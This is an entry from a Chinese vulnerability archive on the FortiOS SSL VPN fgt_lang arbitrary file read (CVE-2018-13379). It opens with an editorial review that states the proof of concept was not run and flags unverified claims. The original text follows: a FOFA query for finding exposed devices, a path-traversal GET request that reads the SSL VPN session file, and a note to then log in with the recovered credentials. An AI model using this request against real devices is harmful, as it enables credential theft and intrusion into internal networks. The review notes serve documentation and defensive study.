---
source: "wy876 漏洞文库"
id: "vw-2ab12c8e2ab0f349c46971ea"
entity_id: "ve-2ab12c8e2ab0f349c46971ea"
schema_version: "1"
title: "Fortigate SSL VPN fgt_lang存在任意文件读取漏洞"
product: "Fortinet FortiOS SSL VPN"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2018-13379"
referenced_identifiers: ""
prerequisites: "未说明固件；需SSLVPN服务及会话文件内容存在"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Fortinet/FortigateSSLVPNfgt_lang%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ewnsxk842voyxx9o"
source_status: "recorded"
---

# Fortigate SSL VPN fgt_lang存在任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Fortinet FortiOS SSL VPN
- 本文讨论：fgt_lang文件读取（CVE-2018-13379候选）
- 版本、权限与配置前提：未说明固件；需SSLVPN服务及会话文件内容存在
- 资料类型：短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 与94的13379段同路径/机制重复却缺CVE/版本
- 48万服务数无时间/来源；读取文件不能保证有可用凭据及直接内网失陷
- 无响应证据，报文标java
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 会话文件条件、资产数与版本待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
飞塔防火墙设备的专用名词，Fortinet是飞塔的品牌，而FortiGate 是指飞塔硬件。Fortinet的屡获殊荣的FortiGate系列，是采用ASIC加速的UTM解决方案，可以有效地防御网络层和内容层的攻击。Fortinet将其SSL VPN产品线称为Fortigate SSL VPN,主要应用于最终用户以及中型企业。目前互联网上这些服务器的数量已超过48万台,主要集中在亚洲及欧洲区域。FortinetSSL VPN系统存在任意文件读取漏洞，攻击者通过漏洞可以通过VPN进入内网，导致内网失陷。

# 二、影响版本
+ Fortigate SSL VPN

# 三、资产测绘
+ fofa`app="FORTINET-SSLVPN"`
+ 特征


# 四、漏洞复现
```http
GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
```


<font style="color:rgb(34, 34, 34);">根据账号密码登录即可</font>


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ewnsxk842voyxx9o>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
